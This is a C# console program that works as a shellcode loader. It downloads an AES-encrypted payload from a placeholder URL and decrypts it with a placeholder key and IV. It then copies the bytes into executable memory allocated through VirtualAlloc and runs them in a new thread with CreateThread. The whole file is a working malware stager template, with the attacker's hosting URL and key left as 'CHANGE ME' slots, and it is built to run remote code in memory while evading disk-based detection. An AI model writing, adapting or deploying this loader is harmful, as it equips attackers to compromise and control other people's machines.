using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ConsoleApp1
{
    class Program
    {
        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }
        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ulong dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        private static string DecryptDataWithAes(string cipherText, string keyBase64, string vectorBase64)
        {
            using (Aes aesAlgorithm = Aes.Create())
            {
                aesAlgorithm.Key = Convert.FromBase64String(keyBase64);
                aesAlgorithm.IV = Convert.FromBase64String(vectorBase64);
                // DEBUG REMOVE IF NEEDED
                Console.WriteLine($"Aes Cipher Mode : {aesAlgorithm.Mode}");
                Console.WriteLine($"Aes Padding Mode: {aesAlgorithm.Padding}");
                Console.WriteLine($"Aes Key Size : {aesAlgorithm.KeySize}");
                Console.WriteLine($"Aes Block Size : {aesAlgorithm.BlockSize}");


                // Create decryptor object
                ICryptoTransform decryptor = aesAlgorithm.CreateDecryptor();

                byte[] cipher = Convert.FromBase64String(cipherText);

                //Decryption will be done in a memory stream through a CryptoStream object
                using (MemoryStream ms = new MemoryStream(cipher))
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            return sr.ReadToEnd();
                        }
                    }
                }
            }
        }
        public static string FetchContent(string url)
        {
            HttpClient _httpClient = new HttpClient();
            try
            {
                HttpResponseMessage response = _httpClient.GetAsync(url).Result;
                response.EnsureSuccessStatusCode();
                string responseBody = response.Content.ReadAsStringAsync().Result;
                return responseBody;
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine($"Error fetching data: {e.Message}");
                return null;
            }
        }
        static void Main()
        {
            string url = "<url_to_hosted_payload>"; // CHANGE ME

            string cipherText = FetchContent(url);

            if (cipherText != null)
            {
                Console.WriteLine("Fetched Content:");
            }
            else
            {
                Console.WriteLine("Unable to read package info.");
                Environment.Exit(3);
            }
            var keyBase64 = "<base64_encoded_key>"; // CHANGE ME
            var vectorBase64 = "<base64_encoded_iv>"; // CHANGE ME
            string plainText1 = DecryptDataWithAes(cipherText, keyBase64, vectorBase64);

            string first10 = plainText1.Substring(0, 10);
            string last10 = plainText1.Substring(plainText1.Length - 10);

            // DEBUG REMOVE IF NEEDED
            Console.WriteLine($"First 10 characters: {first10}");
            Console.WriteLine($"Last 10 characters: {last10}");
            
            byte[] buf = Convert.FromBase64String(plainText1);
    

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (ulong)buf.Length, (uint)StateEnum.MEM_COMMIT, (uint)Protection.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, addr, buf.Length);
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(0, 0, (IntPtr)(addr), IntPtr.Zero, 0, ref threadId);
            // DEBUG REMOVE IF NEEDED
            Console.WriteLine("Starting");
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}